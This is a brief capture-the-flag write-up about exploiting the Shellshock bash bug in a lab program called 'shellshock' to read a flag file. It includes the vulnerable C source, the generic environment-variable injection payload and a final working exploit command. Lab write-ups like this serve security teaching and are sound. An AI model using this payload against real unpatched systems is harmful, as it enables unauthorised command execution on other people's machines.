### Analysis

The program `shellshock` runs a custom `bash` binary located in the same directory. The `bash` binary is vulnerable to the Shellshock vulnerability, which allows arbitrary command execution via environment variables. By exploiting this vulnerability, we can execute commands such as `cat flag` to retrieve the flag.

```C
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```
### Exploit

1. **Shellshock Vulnerability**:
   - The Shellshock vulnerability allows executing arbitrary commands by defining a malicious environment variable.
   - The syntax for exploiting Shellshock is:

     ```bash
     env x='() { :;}; <command>' bash -c "echo this is a test"
     ```
   
   - Here, `<command>` is the arbitrary command we want to execute.

2. **Exploit the Custom `bash`**:
   - The program uses a custom `bash` binary located in the same directory (`./bash`).
   - We can exploit the Shellshock vulnerability in this custom `bash` to execute commands.

### Final Command

Run the following command to exploit the Shellshock vulnerability and retrieve the flag:

```bash
env x='() { :;}; ./bash -c "cat flag"' ./shellshock
```
